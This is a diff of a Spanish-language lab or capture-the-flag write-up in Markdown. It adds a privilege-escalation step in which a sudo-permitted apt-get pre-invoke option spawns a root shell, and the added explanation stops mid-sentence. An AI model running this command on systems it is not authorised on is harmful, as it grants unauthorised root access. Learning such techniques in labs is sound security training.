@@ -63,5 +63,6 @@ Nmap done: 1 IP address (1 host up) scanned in 84.71 seconds
 ### Escalada de privilegios
 ![[Pasted image 20240110203913.png]]
 ###### el usuario jake tiene permisos sudo para ejecutar el binario /apt/get usaremos esto para escalar privilegios
-###### usaremos el codigo 
+###### usaremos el codigo  "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh" 
+este codigo nos per
 ![[Pasted image 20240110204224.png]]
